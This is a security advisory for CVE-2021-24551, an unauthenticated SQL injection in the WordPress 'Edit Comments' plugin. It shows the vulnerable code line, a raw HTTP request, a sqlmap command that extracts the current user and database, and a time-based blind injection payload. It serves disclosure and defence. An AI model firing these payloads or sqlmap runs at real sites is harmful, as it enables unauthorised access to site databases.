Vulnerability : [Injection](/category/injection/)
Minimum Level of Access Required : Unauthenticated
CVE Number : CVE-2021-24551
Identified by : [Shreya Pohekar](/author/shreya_pohekar/)
[WPScan Reference URL](https://wpscan.com/plugin/edit-comments/)
### Disclosure Timeline

* June 1, 2021: Issue Identified and Disclosed to WPScan
* June 2, 2021 : Plugin Closed
* July 20, 2021 : CVE Assigned
* July 23, 2021 : Public Disclosure

### Technical Details

The edit comment functionality, available to unauthenticated users takes in GET parameter `jal_edit_comments` and inserts it into the SQL statement without proper sanitization, escaping or validation therefore leaading to unauthenticated SQLI.

Vulnerable\_code: [jal-edit-comments.php#L52](https://plugins.trac.wordpress.org/browser/edit-comments/trunk/jal-edit-comments.php#L52)

```
52:             $jal_comment = $wpdb->get_row("SELECT comment_content, comment_author_IP, comment_date_gmt FROM $wpdb->comments WHERE comment_ID = ".$_GET['jal_edit_comments']);

```
#### PoC Screenshot

![PoC Screenshot](/disclosure_screenshots/edit-comments-poc.png)

#### Exploit

```
GET /2021/03/02/hello-world/?jal_edit_comments=4 HTTP/1.1
Host: 172.28.128.50
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://172.28.128.50/2021/03/02/hello-world/
Accept-Language: en-US,en;q=0.9
Connection: close

```
#### SQLmap command

```
sqlmap -r edit-comments.req --dbms mysql --current-user --current-db -b -p jal_edit_comments --batch

```
#### Steps to reproduce

1. Download and activate the plugin.
2. With the plugin you get a code for comments.php. Replace you theme’s comment.php with the one obtained with the plugin. This will also change the look and feel of the comment section.
3. Now comment with any user.
4. Click the `e` button that comes alongside the posted comment. That helps you to edit the comment.
5. Paste this payload: http:///2021/03/02/hello-world.html?jal\_edit\_comments=7%20AND%20(SELECT%209114%20FROM%20(SELECT(SLEEP(5)))wjzD)
6. You will experience a delay of 5 sec before the page is loaded and hence confirms the vulnerability.
